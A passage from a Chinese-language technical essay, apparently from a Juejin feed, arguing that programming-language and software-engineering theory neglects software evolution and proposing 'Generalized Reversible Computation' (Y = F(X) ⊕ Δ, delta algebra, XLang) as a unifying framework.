</blockquote>
<p>这导致了三个结果：</p>
<ol>
<li>
<p>范畴论被收编进了“函数式 + 类型语义”的体系，<br/>
很少用于表达“结构空间之间的映射”“多表象之间的关联”。</p>
</li>
<li>
<p>对象被等价于 type 后，“坐标系唯一确定值”“场在每一点赋值”这种概念就很难自然进入理论。
类型在本质上是把一撮值归入一个等价类，而不是把每个点放在坐标系中的唯一位置。</p>
</li>
<li>
<p>研究焦点局限在“变换如何组合”，<br/>
而不是“这些变换作用的程序空间本身长什么样、局部结构如何、微扰如何叠加”。</p>
</li>
</ol>
<p>也就是说：</p>
<blockquote>
<p>范畴论本来可以帮助我们研究“模型空间 + 多表象 + 差量映射”，<br/>
但目前被限缩成了“高度高级的类型语义包装”。</p>
</blockquote>
<p>这在世界观上，是一种“从一开始就选窄了”的用法。</p>
<h2 data-id="heading-4">二、现实世界真正难的问题：长期演化 + 可变性管理</h2>
<p>工程实践中，几乎所有中大型系统的真实问题都绕不开这几个词：</p>
<ul>
<li>版本演化（V1 → V2 → …）；</li>
<li>客户/地区/行业定制（产品线）；</li>
<li>长期维护中的腐化与技术债；</li>
<li>多模型间的一致性和“概念漂移”。</li>
</ul>
<h3 data-id="heading-5">2.1 我们最大的问题从来不是“写出一个干净的 v1.0”</h3>
<p>假设你有一个完美类型安全的语言、一个经过形式验证的编译器，然后你写了一个 v1.0：</p>
<ul>
<li>编译通过；</li>
<li>关键属性验证通过；</li>
<li>部署稳定。</li>
</ul>
<p>接下来五年发生的是：</p>
<ul>
<li>需求变了；</li>
<li>新法规/新政策；</li>
<li>某大客户想要两个奇怪的特性；</li>
<li>旧模块不能停机，只能逐步迁移；</li>
<li>部分团队不同栈维护子系统，各自演化。</li>
</ul>
<p>这时你面对的是：</p>
<ul>
<li>源码树上几十个分支；</li>
<li>数据模型 schema 一遍遍迁移；</li>
<li>配置和 feature flag 满天飞；</li>
<li>文档滞后，模型与代码脱节。</li>
</ul>
<p>在这一堆混乱中：</p>
<blockquote>
<p>我们实际操作的基本单位，不再是“完整程序”，而是各种 granularity 的 <strong>Δ：<br/>
小 patch、schema diff、配置 overlay、DSL fragment 的增删改、rewrite 脚本……</strong></p>
</blockquote>
<p>可以说：<br/>
<strong>在长期演化语境里，一切工程工作都是在操作 Δ。</strong></p>
<p>但这些 Δ 在理论上处于什么地位？</p>
<ul>
<li>在 Git 里，它是文本 diff；</li>
<li>在数据库迁移里，它是 DDL 片段；</li>
<li>在配置里，它是某种 patch/overlay；</li>
<li>在 MDA/低代码平台里，它是“生成后手工改动的一坨”。</li>
</ul>
<p>它们是日常核心，却被视为“工程细节”，被认为是需要被摆脱的噪音和偏移，很少被系统抽象。</p>
<h3 data-id="heading-6">2.2 生成与演化的割裂：F(X) vs “手工改一堆”</h3>
<p>模型驱动工程、代码生成器、低代码平台、模板系统，基本都遵循一个模式：</p>
<ul>
<li>描述一个模型 X；</li>
<li>通过生成器 F(X)，生成骨架或大量样板代码；</li>
<li>然后在生成结果里继续手改、补逻辑、修 bug。</li>
</ul>
<p>现实公式其实是：</p>
<blockquote>
<p>App = F(X) + manual adjustments</p>
</blockquote>
<p>手工调整那一坨有几个显著问题：</p>
<ul>
<li>无结构（散布在各种文件中）；</li>
<li>无统一语义（难以分析）；</li>
<li>不可逆，也很难抽出成 Δ；</li>
<li>模型和生成代码再也同步不回去了。</li>
</ul>
<p>这造成几个典型后果：</p>
<ul>
<li>逃离模型：团队一开始用 MDA/低代码，后来发现生成代码改多了，再也不敢重生成，只好“脱离平台自己干”；</li>
<li>技术债堆积：无法系统梳理哪些变更是“一般性扩展”、哪些是“客户临时 hack”；</li>
<li>平台方束手无策：平台升级一次，下游产品线全部重测，几十个客户各有一套 patch。</li>
</ul>
<p>从理论角度看，这是一个非常鲜明的断裂：</p>
<blockquote>
<p>生成 F(X) 被当作“理论上有价值的东西”，<br/>
Δ（各类定制与演化）被视为“落地过程中的脏活累活”，没有被纳入统一形式框架。</p>
</blockquote>
<p>而 GRC 的核心公式正好改写这个模式：</p>
<pre><code class="hljs language-text" lang="text">App = Generator&lt;DSL&gt; ⊕ Δ
即 Y = F(X) ⊕ Δ
</code></pre>
<p>其中：</p>
<ul>
<li>F(X)：规范化的“主干”，由生成器+DSL 生成；</li>
<li>Δ：结构化差量，收纳所有偏离主干的东西；</li>
<li>⊕：有形式语义和代数性质的合并运算。</li>
</ul>
<p><strong>严重缺陷在于：我们有大量关于 F 的理论，却几乎没有关于 Δ 和 ⊕ 的统一理论。</strong><br/>
GRC 把这两个“黑箱”拉到中心来研究。</p>
<p>进一步说：如果不在语言和模型的层面显式定义“结构坐标”和“差量规则”，Δ 永远只能以“文本 patch/脚本”的形式出现，无法进入理论中心。</p>
<h3 data-id="heading-7">2.3 “可变性管理”停留在枚举扩展点阶段</h3>
<p>软件产品线工程所提出的核心技术问题是所谓的可变性管理。这几乎是一个万能箩筐型的问题。我们在软件开发和演化过程中所遭遇的几乎所有困难都能够很容易的被归因于应对变化的能力不足。</p>
<p>软件产品线（SPL）、feature model、plugin architecture，都在谈 variability management。它们做了不少事情：</p>
<ul>
<li>把特性抽象成 feature；</li>
<li>建图（feature diagram）；</li>
<li>用条件编译、差量模块、策略注入等方式实现变体。</li>
</ul>
<p>但主流实践仍然有几个局限：</p>
<ol>
<li>
<p>扩展点大多是<strong>预先定义的</strong></p>
<ul>
<li>“这里留个 hook，将来客户可以在这里插”？</li>
<li>“这个策略用接口封装起来，以后可以换实现”。</li>
</ul>
<p>这对可预期的变化有效，但对“新变化点随时冒出来”就吃力了。</p>
</li>
<li>
<p>“Core” 和 “Variant” 并不在同一模型空间</p>
<ul>
<li>Core 是某种代码/架构；</li>
<li>feature model 在另一套逻辑树里；</li>
<li>二者之间没有统一的 Δ/⊕ 结构。</li>
</ul>
</li>
<li>
<p>构造与演化依旧是分裂活动</p>
<ul>
<li>Core 是“构造”；</li>
<li>Variant 是“演化/定制”；</li>
<li>不在同一方程里。</li>
</ul>
</li>
</ol>
<p>所以你会看到：</p>
<blockquote>
<p>很多 SPL 实践在 paper 里看起来很优雅，<br/>
真正做大规模产品线时，依然要靠分支 + 手工 diff + 合并大战来撑着。</p>
</blockquote>
<p>本质上，<strong>特征代数缺乏与模型空间的严密绑定，变体仍然太多停留在代码/宏级，而不是语义模型级</strong>。</p>
<blockquote>
<p>根据理论上的分析，可变性管理的真正困难在于如何有效的管控预料之外的（unexpected）变化。如果我们对一个领域非常熟悉，而且领域内的变化方式为有限的几种，那么就可以在关键位置设置几个恰到好处的扩展点，举重若轻的解决可变性问题。但如果变化的可能位置不断增加，变化的方式不断翻新花样（换句话说，也就是变化的自由度不断增加，直至趋于无穷），那么迟早这种变化的自由度会超越手工枚举能够管控的范围。在这种充满未知的演化图景下，我们如何实现对无限多的变化自由度的有效描述和管控？在物理学中，这实际上属于一个已经被解决了的问题。</p>
</blockquote>
<blockquote>
<p>在高中阶段我们所学习的牛顿物理学是所谓古典力学中的刚体力学。它的世界观是完全机械化的：刚体的运动完全由它的质心坐标和尺寸形状朝向等少数几个参数来描述，刚体的内部构造无法被观测也无关紧要，刚体之间通过直接接触发生相互作用，刚体的形状必须精确匹配才能构成一个无缝的整体（可以对比一下软件组件的黑箱模型）。即使是在古典力学中，稍微高级一点的观点也都会转换到拉格朗日表述或者哈密尔顿表述，它的精神实质是转向场论的世界观。所谓的场（Field），其实就是建立一个无所不在的坐标系，然后在坐标系的每一点上都可以指定一个物理量。场的自由度是无限的，但是通过坐标系它是可描述的、可定义的、可研究的，在坐标系的每一点上我们都可以精确的度量局部的变化。基于同样的精神，可逆计算的基本设定是首先建立一个足够精细和通用的领域描述坐标系，在这个坐标系中我们能够做到指哪打哪和打哪指哪（坐标的唯一性）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">三、核心缺陷归纳：缺的不是“更强类型”，而是一套关于“变化”的科学</h2>
<p>把上述问题压缩，可以勾勒出当前 PL/SE 理论的几个结构性短板。</p>
<h3 data-id="heading-9">3.1 研究重心放错层级：聚焦“单个程序”，忽视“程序族”</h3>
<ul>
<li>我们在“单一程序 P 的类型安全、语义正确性”上，几乎做到了极致；</li>
<li>对“程序族 {P₀, P₁, …, Pₙ} 的结构与演化”，只有零碎的理论，不成主线。</li>
</ul>
<p>换句话说：</p>
<blockquote>
<p>类型论之于静态安全，已经是一门成熟的“科学”；<br/>
而关于“长期演化及其结构”的东西，还散落在多个子领域，缺乏总理论。</p>
</blockquote>
<h3 data-id="heading-10">3.2 差量（Δ）与合并（⊕）没有被当作一等数学对象</h3>
<p>现实中我们不断“发明”差量：</p>
<ul>
<li>Git 有行文本 diff + merge，但语义弱、噪声高、合并无封闭性；</li>
<li>产品线有 feature algebra，但通常与实现 artifact 之间存在巨大鸿沟；</li>
<li>AOP 提供了一种“织入式差量”，但切点是基于脆弱的代码模式；</li>
<li>Lenses/BX 把 Δ 引入视图更新问题，但通常只在 A↔B 两个模型的同步范围内。</li>
</ul>
<p>这些差量存在的问题是：</p>
<ul>
<li>语义不统一；</li>
<li>公理不明确；</li>
<li>层次混乱（文本级、语法级、语义级混在一起）。</li>
</ul>
<p>缺的是：</p>
<blockquote>
<p>在“模型/DSL空间”中，建立统一的<strong>差量代数</strong>：</p>
<ul>
<li>明确定义 Δ 的结构；</li>
<li>定义 ⊕ 的闭包、结合律、单位元、局部逆；</li>
<li>把可追踪、可合并、可回滚、可逆这些需求，变成代数性质。</li>
</ul>
</blockquote>
<p>换句话说：</p>
<ul>
<li>我们无数次在实践里“发明”差量：schema diff、config overlay、patch、plugin；</li>
<li>却没有把它们拉回同一张黑板上，用同一套符号和公理来刻画。</li>
</ul>
<p>而传统类型系统的等价类思维，本能关注的是“哪些值是同一类”，而不是“一个结构位点上的微扰 Δ 如何叠加、相消、可逆”，这使得差量和场论天然被排除在理论视野之外。</p>
<h3 data-id="heading-11">3.3 语言被定义成“语法 + 类型 + 求值规则”，而不是“结构空间 + 坐标 + 演化路径”</h3>
<p>主流对语言的隐含定义：</p>
<blockquote>
<p>语法（BNF） + 类型系统 + 操作语义（或 denotational semantics）</p>
</blockquote>
<p>它回答的是：</p>
<ul>
<li>哪些表达式是合法的？</li>
<li>它们如何运行？</li>
</ul>
<p>但它不直接回答：</p>
<ul>
<li>这门语言能生成的<strong>全部程序结构 S</strong> 是什么？</li>
<li>在 S 上，什么是“合法变形/演化 Δ”？</li>
<li>Δ 如何组合、是否可逆、是否有度量？</li>
<li>一条演化路径 Δ₁ ⊕ Δ₂ ⊕ … ⊕ Δₙ 的“形状”可以怎样分析？</li>
</ul>
<p>如果不先把“结构空间”当成语言本体，要谈：</p>
<ul>
<li>场（field）；</li>
<li>微扰（perturbation）；</li>
<li>演化路径上的累计效应（类似积分）；</li>
</ul>
<p>都会非常尴尬。</p>
<p>而如果改用 GRC 式的定义：</p>
<blockquote>
<p>一门语言定义了一种程序结构空间 S，<br/>
语言是构造 S 中元素的规则，<br/>
并在 S 上给出差量 Δ 与合并 ⊕ 的语义。</p>
</blockquote>
<p>那么程序/模型不再只是“语法树”，<br/>
而是“空间上的点”；演化操作就是“在空间上施加的 Δ”。</p>
<p>从这个视角再看现实语言，就能看到差异：</p>
<ul>
<li>常规语言：BNF + 类型规则 + 求值语义，但不显式给出“结构空间 + Δ 规则”；</li>
<li>XLang：
<ul>
<li>有 XDef 作为统一元模型，定义领域结构坐标；</li>
<li>在每个坐标点支持 (data, ext_data) 这种“主体 + 扩展”的成对结构；</li>
<li>内置差量叠加规则，与 <code>Y = F(X) ⊕ Δ</code> 范式自然契合。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-12">3.4 软件产品线 / 多模型协同缺乏统一“空间观”</h3>
<p>现实的大型系统，存在大量不同层次的模型：</p>
<ul>
<li>数据模型（ORM/Schema）；</li>
<li>业务流程（Workflow DSL）；</li>
<li>UI 描述；</li>
<li>配置；</li>
<li>代码；</li>
<li>部署拓扑（Kubernetes YAML 等）。</li>
</ul>
<p>这些 artifact 之间存在映射关系，但：</p>
<ul>
<li>大多数工具只在某一层做一点转换（ORM 生成 DAO、API 生成 SDK 等）；</li>
<li>没有一个统一“模型空间 Atlas”的框架，把这些模型视为不同表象的“同一语义核心”的多种表示；</li>
<li>变化往往在某一层硬 patch，无法系统地反向传播或同步到其他层。</li>
</ul>
<p>这导致：<br/>
多模型系统的演化 = 各层分别演化 + 人工同步 + 不断累积概念漂移。</p>
<p><strong>严重缺陷就是：我们没有把多模型协同当作一个“多坐标系 + 可逆变换 + 差量传播”的统一问题来建模。</strong></p>
<hr/>
<h2 data-id="heading-13">四、广义可逆计算(GRC)：以“结构空间 + Δ + ⊕”为中心的演化范式</h2>
<p>前面描述的是缺口，下面引入 GRC，作为一个已经部分成型的补全方向。</p>
<h3 data-id="heading-14">4.1 一个核心公式：Y = F(X) ⊕ Δ</h3>
<p>GRC 用一个统一公式刻画软件构造与演化：</p>
<pre><code class="hljs language-text" lang="text">App = Delta x-extends Generator&lt;DSL&gt;
即 Y = F(X) ⊕ Δ
</code></pre>
<p>解释：</p>
<ul>
<li>Y：目标系统（应用）；</li>
<li>X：模型（DSL 实例）；</li>
<li>F(X)：由 Generator 根据 DSL/模型生成的主体部分；</li>
<li>Δ：差量，用于定制、调整、补充；</li>
<li>⊕：差量合并运算，要求具备明确的代数属性（至少结构层面上的结合、单位元、闭包）。</li>
</ul>
<p>这可以从三种视角理解：</p>
<ol>
<li>工程视角：<strong>结果 = 生成的主体 + 可控的差量</strong>；</li>
<li>数学视角：类似小波分析的“近似 + 细节”分解；</li>
<li>哲学视角：从“静态实体”的本体论转向“生成与演化”的过程本体论。</li>
</ol>
<p>这条公式可以在所有层级递归展开：</p>
<ul>
<li>应用层：App = Generator(DomainDSL) ⊕ Δ_app</li>
<li>模型层：DomainDSL = DslGenerator(MetaModel) ⊕ Δ_dsl</li>
<li>元模型层：MetaModel' = MetaModel ⊕ Δ_metamodel</li>
<li>工具层：Generator2 = Generator1 ⊕ Δ_generator</li>
</ul>
<p>一旦接受这个公式，很多传统矛盾可以系统化重写：</p>
<ul>
<li>
<p>标准化 vs 灵活性：</p>
<ul>
<li>F(X) 追求极致标准化、自动化；</li>
<li>Δ 提供极致定制、灵活性；</li>
<li>⊕ 保证组合仍可控、可追踪。</li>
</ul>
</li>
<li>
<p>生成 vs 手工修改：</p>
<ul>
<li>不再是“生成 + 不可重放的 manual hack”；</li>
<li>而是“生成 + 显式结构化 Δ”；</li>
</ul>
</li>
<li>
<p>核心产品 vs 客户定制：</p>
<ul>
<li>Effective System = Base ⊕ Δ_Industry ⊕ Δ_Region ⊕ Δ_Customer；</li>
<li>核心演化与客户差异被分解在不同 Δ 子空间。</li>
</ul>
</li>
</ul>
<p>换句话讲：</p>
<blockquote>
<p>这条公式把“构造”和“演化”统一成<strong>同一种操作</strong>：叠加 Δ。</p>
</blockquote>
<ul>
<li>构造（生成）和演化（定制）只是在不同层、不同坐标系上的 Δ 叠加；</li>
<li>复杂系统 = 多层 Generator + 多层 Δ 的纵横递归分解。</li>
</ul>
<h3 data-id="heading-15">4.2 一切皆差量（Everything is a Delta）</h3>
<p>在有幺元的代数结构里，任何对象都可以被看成：</p>
<blockquote>
<p>A = 0 ⊕ A</p>
</blockquote>
<p>所以在软件世界里，完全可以这样看：</p>
<ul>
<li>“一个完整系统”本身就是从“无”到“有”的一大坨 Δ_genesis；</li>
<li>所有后续修改都是在这坨 Δ 上继续叠加更多 Δ；</li>
<li>克隆 + 修改一个系统，其实是“对现有系统应用一个 Δ_clone”。</li>
</ul>
<p>于是，“一切皆差量”不是口号，而是：</p>
<blockquote>
<p>把“全量”视为“相对于单位元的一次 Δ”。</p>
</blockquote>
<p>在这个视角下，语言、DSL、工具，都需要回答三个问题：</p>
<ol>
<li>它的结构空间 S 是什么？</li>
<li>在 S 上，差量 Δ 的基本“语法单位”是什么？</li>
<li>⊕ 的代数性质是什么（封闭、结合、单位元、局部逆等）？</li>
</ol>
<p>只有回答了这三个问题，才算在这门语言/模型上真正具备“演化的理论”。</p>
<h3 data-id="heading-16">4.3 引入可逆性：用逆元来控制熵增</h3>
<p>从物理学中，我们知道：</p>
<ul>
<li>熵增是不可避免的；</li>
<li>但可逆过程熵保持不变，越不可逆，熵增越大。</li>
</ul>
<p>在软件世界里，完全一样：</p>
<ul>
<li>每次临时 hack、耦合、不结构化改变，都在增加系统“混乱度”；</li>
<li>一定时间后，就演变为“没人敢动”的遗产代码。</li>
</ul>
<p>可逆计算提出：</p>
<ul>
<li>尽量让每个局部操作都有配对的逆操作；</li>
<li>如果各个局部可逆，且组合关系也可逆，则整体可逆；</li>
<li>可逆性越强，系统演化时“结构信息”的损耗越小，相当于熵增受控。</li>
</ul>
<p>在软件实践中，这具体落地为：</p>
<ul>
<li>差量 Δ 尽量是可逆的；</li>
<li>合并 ⊕ 重视“如何可拆解/回滚某个 Δ”；</li>
<li>客户定制、行业特化，尽量集中到可剥离、可抛弃的 Δ_customer 中，而不是侵入核心。</li>
</ul>
<p>这与“把熵增集中在差量里”的想法对应：</p>
<blockquote>
<p>核心模型保持低熵，客户的随机性、偶然性集中在一个可分离的差量层中。</p>
</blockquote>
<p>所以：</p>
<ul>
<li>可逆性不只是“方便 undo”，</li>
<li>而是<strong>延缓和局限熵增，延长系统可维护寿命的手段</strong>。</li>
</ul>
<h3 data-id="heading-17">4.4 与 DDD / MDA / SPL 的统一解释</h3>
<p>GRC 并不是要推翻已有方法，而是给出统一解释：</p>
<ul>
<li>MDA：<br/>
传统 <code>App = Transformer(Model)</code> → GRC 中是 <code>App = Generator(Model) ⊕ Δ</code>，<br/>
生成与定制统一，解决模型与代码割裂问题。</li>
<li>SPL / 复用：<br/>
从 “A &gt; B（继承）”、“A = B + C（组件）”<br/>
到 “B = A + (-C)” 和 <code>Base ⊕ Δ_Industry ⊕ Δ_Region ⊕ Δ_Customer</code>，<br/>
让“相关即可复用”，并隔离核心产品与定制演化。</li>
<li>DDD：<br/>
在“空间-时间-语言-变化”四维上重读 DDD：
<ul>
<li>空间：限界上下文是相对空间，防腐层是坐标变换；</li>
<li>时间：领域事件是状态空间上的差量 Δ（<code>NewState = OldState ⊕ Event</code>）；</li>
<li>语言：通用语言 / DSL 是坐标系；</li>
<li>变化：演化是在坐标系上任意点的扰动。</li>
</ul>
</li>
</ul>
<p>研究重点转向：</p>
<ul>
<li>如何设计 F（生成器）让基态结构尽可能“简单、规范、语义清晰”；</li>
<li>如何设计 Δ 的数据结构和 ⊕ 的代数性质，让演化可组合、可回滚、可合并、局部可逆。</li>
</ul>
<p>这其实是在软件工程中引入一套“离散微积分”：局部微扰（Δ）、路径积分（⊕ 的迭代）、局部逆（可撤销的变更），从而有机会用熵、可逆性等概念来刻画演化质量。</p>
<h3 data-id="heading-18">4.5 多 DSL / 多模型 / 多表象：一个“模型空间 Atlas”</h3>
<p>现实中你会有：</p>
<ul>
<li>领域 DSL（业务规则、工作流、权限等）；</li>
<li>数据模型 DSL（ORM、schema）；</li>
<li>UI DSL；</li>
<li>配置 DSL；</li>
<li>Excel 表格、可视化编辑器作为另一种表象。</li>
</ul>
<p>可逆计算视角下：</p>
<ul>
<li>它们是同一语义世界的不同坐标系；</li>
<li>语言工作台的统一元模型（XDef）给出“共同的结构空间”；</li>
<li>利用 lens/BX/transform 在不同表象之间进行可逆（或可控损失）的变换；</li>
<li>每个表象下的 Δ 可以通过 transform 映射到 canonical 结构空间中的 Δ。</li>
</ul>
<p>这就把：</p>
<ul>
<li>MDA、Xtext、语言工作台、DSL 工程；</li>
<li>BX/lens、模型同步；</li>
<li>Excel/GUI 与文本/AST 的互转；</li>
</ul>
<p>都统一到一张更大的图景里：<br/>
<strong>一个多坐标系的模型空间 Atlas，上面运行着 Δ 与 ⊕ 的演化。</strong></p>
<p>GRC 在实践中通过“语言工作台”体现这一点：</p>
<ul>
<li><strong>统一元模型（XDef）</strong>：所有 DSL 基于同一元模型定义，实现无缝嵌入与协同。</li>
<li><strong>内置差量机制（x-extends）</strong>：变化在 DSL 层就是一等公民，保证各 DSL 间合并语义一致。</li>
<li><strong>多重表象</strong>：同一模型可以在 XML / JSON / Excel / 可视化设计器间无损转换，实现“推导 + 修正”的工作模式：
<ul>
<li>推导：从规范 DSL 自动生成 artifact；</li>
<li>修正：通过 Δ 对生成结果做非侵入式补充和微调。</li>
</ul>
</li>
</ul>
<p>如果这套用法成为主流，我们会自然把：</p>
<ul>
<li>各种模型空间（DSL、Excel、JSON、可视视图…）</li>
<li>各种表象之间的变换（解析、生成、编辑器）</li>
<li>差量在各表象之间的对应</li>
</ul>
<p>统一到“范畴/函子/伴随”这个层次上。<br/>
而不是继续把范畴锁在类型世界里。这更符合范畴论的本义。</p>
<p>例如：</p>
<ul>
<li>把 Excel 文件空间看作一个范畴；</li>
<li>把 DSL 模型空间看作另一个范畴；</li>
<li>定义一个 Generic 的解析器，作为从 Excel 范畴到 DSL 范畴的模型解析函子；</li>
<li>再定义一个从 DSL 到 Excel 的Report导出函子，形成一对伴随。</li>
</ul>
<p>一个好的可视化 Editor: Model → View，本质上应该是一个保差量结构的函子，满足 Editor(Base ⊕ Ext) ≈ Editor(Base) ⊕ Editor(Ext) 这种同态性质，这样 Δ 在视图层也能干净分解、可逆回到模型</p>
<h2 data-id="heading-19">五、回到原问题：真正严重的缺陷是什么？</h2>
<p>现在可以比较精确地回答：“目前 PL / SE 研究中真正严重的缺陷是什么？”</p>
<h3 data-id="heading-20">5.1 缺陷不在某个技术分支，而在“世界观层级选错了”</h3>
<p>当前体系把“软件科学的主峰”设在：</p>
<blockquote>
<p>如何定义和验证一个程序 P（静态安全、语义正确、行为可预测）。</p>
</blockquote>
<p>但现实中最难、最关键的问题，是：</p>
<blockquote>
<p>如何系统地定义、操作、推理一整个程序族及其长期演化，<br/>
即：{P₀, P₁, …, Pₙ} 与 {Δ₁, Δ₂, …, Δₙ} 的结构。</p>
</blockquote>
<p>这个层级被严重低估了，且被“外包”给工程实践。</p>
<h3 data-id="heading-21">5.2 差量（Δ）与可逆性没有被当作“数学一等公民”</h3>
<p>我们有：</p>
<ul>
<li>成熟的类型论处理静态安全；</li>
<li>熟练的形式方法处理“一个版本”的正确性；</li>
<li>零散的 delta-oriented programming、SPL、BX 等各自讲自己的 Δ。</li>
</ul>
<p>但我们没有的是：</p>
<ul>
<li>一门类似“类型论之于静态安全”的**“变化科学”**；</li>
<li>明确以 Δ、⊕、可逆性、熵增、演化轨迹为对象的主流理论主线。</li>
</ul>
<p>存在各种零散的Δ，但语义不统一、公理不清晰、层次混乱。<br/>
学界在这上面的系统化抽象严重滞后于工程实际需求。<strong>差量与合并没有被当成“数学对象”，而只是工程工具</strong></p>
<p>GRC 并不是在现有理论之上“再补一个工具层”，而是试图把 Δ/⊕、可逆性、熵增控制，提升到和类型论同一层级的“基础理论组成部分</p>
<h3 data-id="heading-22">5.3 对“软件世界”的理解仍停留在“粒子视角”，缺少“波动/场视角”</h3>
<p>今天的主流视角是：</p>
<ul>
<li>基本单元：对象、模块、组件（粒子）；</li>
<li>关注的是：这个对象是什么，这个模块有什么接口。</li>
</ul>
<p>可逆/差量导向的视角更像“波动/场”：</p>
<ul>
<li>基本单元：结构空间 + 场上的扰动（Δ）；</li>
<li>关注的是：在什么坐标系下发生了什么变化，这些变化如何叠加、相消。</li>
</ul>
<p>这两种视角不是非此即彼，但目前学界几乎全在“粒子侧”，<br/>
“波动/场”侧还远远没有被系统发展。</p>
<h3 data-id="heading-23">5.4 多模型、多 DSL、多表象协同缺乏统一空间观</h3>
<p>现实中的大型系统演化，越来越是“多模型、多视图、多 DSL 的协同演化”。<br/>
而这一块，目前主要依靠：</p>
<ul>
<li>工具链各自做一点转换；</li>
<li>工程师在各层之间人肉同步；</li>
<li>版本久了就失去一致性。</li>
</ul>
<p>缺乏一个统一的“模型空间 + 差量传播”理论来统摄。</p>
<h2 data-id="heading-24">六、最后：这篇回答想表达的立场</h2>
<ul>
<li>
<p>并不是说“类型论、范畴论、形式方法都不重要”，而是：<br/>
它们解决的是“静态正确性 + 局部计算”的问题，而且在“变换本位”的世界观下被用得过于狭窄。</p>
</li>
<li>
<p>真正被低估、也被理论界“外包给工程经验”的，是：</p>
<ul>
<li>生成 + 演化统一建模（Y = F(X) ⊕ Δ）；</li>
<li>差量代数（Δ 的结构与 ⊕ 的公理）；</li>
<li>多表象、多模型之间的可逆变换与差量传播；</li>
<li>程序结构空间的“几何与场”视角（坐标、局部扰动、路径积累）；</li>
<li>用可逆性和熵的视角来理解和控制软件演化。</li>
</ul>
</li>
<li>
<p>这些部分，目前更多是由：</p>
<ul>
<li>Git、迁移脚本、配置系统、脚手架、内嵌 DSL；</li>
<li>架构经验和团队约定；
在支撑，却没有一套像类型/逻辑那样统一、可组合的理论基础。</li>
</ul>
</li>
</ul>
<p>所以，如果要回答“现有研究有哪些严重缺陷”，可以说：</p>
<blockquote>
<p>“严重”并不在于某个技术分支做错了，而在于整个学界的视角在层级上错位——<br/>
把“单个程序的静态安全”当成了软件科学的主峰，而把“变化本身”放在理论视野之外。</p>
<p>而广义可逆计算（GRC）给出了一个候选答案：<br/>
把软件理解为在结构空间上叠加差量场，<br/>
用 <code>Y = F(X) ⊕ Δ</code> 这条方程，把构造与演化统一起来，把可逆性与熵增控制纳入软件理论的基本目标，
让差量（Δ）和合并（⊕）从工程苦工，回到可公理化、可组合、可推理的数学对象。</p>
</blockquote>
<p>参考：</p>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fxao9AKlOST0d97ztuU3z9Q" target="_blank" title="https://mp.weixin.qq.com/s/xao9AKlOST0d97ztuU3z9Q" ref="nofollow noopener noreferrer">DDD本质论:从哲学到数学，再到工程实践的完整指南之理论篇</a>: 结合（广义）可逆计算理论，从哲学、数学到工程层面，系统性地剖析了DDD（领域驱动设计）的技术内核，认为其有效性背后存在着数学必然性。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FpNXPEvyVB7ljOhBQVh6c-A" target="_blank" title="https://mp.weixin.qq.com/s/pNXPEvyVB7ljOhBQVh6c-A" ref="nofollow noopener noreferrer">广义可逆计算: 一个软件构造范式的正名与阐释</a>:为“广义可逆计算”（GRC）正名，阐释了其核心思想——以“差量”（Delta）为第一类公民，系统性地管理软件构造过程中的可逆性与不可逆性，旨在解决“复杂性”这一核心工程难题。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZu80p-8HtfXi7O-IPK5Wxw" target="_blank" title="https://mp.weixin.qq.com/s/Zu80p-8HtfXi7O-IPK5Wxw" ref="nofollow noopener noreferrer">(广义)可逆计算理论速览-统一软件构造与演化的新范式</a>: 提供了（广义）可逆计算理论的快速概览，总结了其核心公式 <code>App = Delta x-extends Generator&lt;DSL&gt;</code>、对传统理论（如模型驱动架构）的继承与发展，以及关键技术实现。</p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FiZWcRa_Af8Io6AAUXd-0Vg" target="_blank" title="https://mp.weixin.qq.com/s/iZWcRa_Af8Io6AAUXd-0Vg" ref="nofollow noopener noreferrer">让演化可编程：XLang 与可逆计算的结构化范式</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhbNiy3E7-JH8_SXpN2EOXg" target="_blank" title="https://mp.weixin.qq.com/s/hbNiy3E7-JH8_SXpN2EOXg" ref="nofollow noopener noreferrer">模型驱动架构的数学内核：统一生成与演化的 Y = F(X) ⊕ Delta 不变式</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。]]></title>    <link>https://juejin.cn/post/7581769891498508307</link>    <guid>https://juejin.cn/post/7581769891498508307</guid>    <pubDate>2025-12-10T02:46:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891498508307" data-draft-id="7581689310644502570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-10T02:46:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            建议去 GitHub 学这 6 个项目，打破 Agent 的信息差。
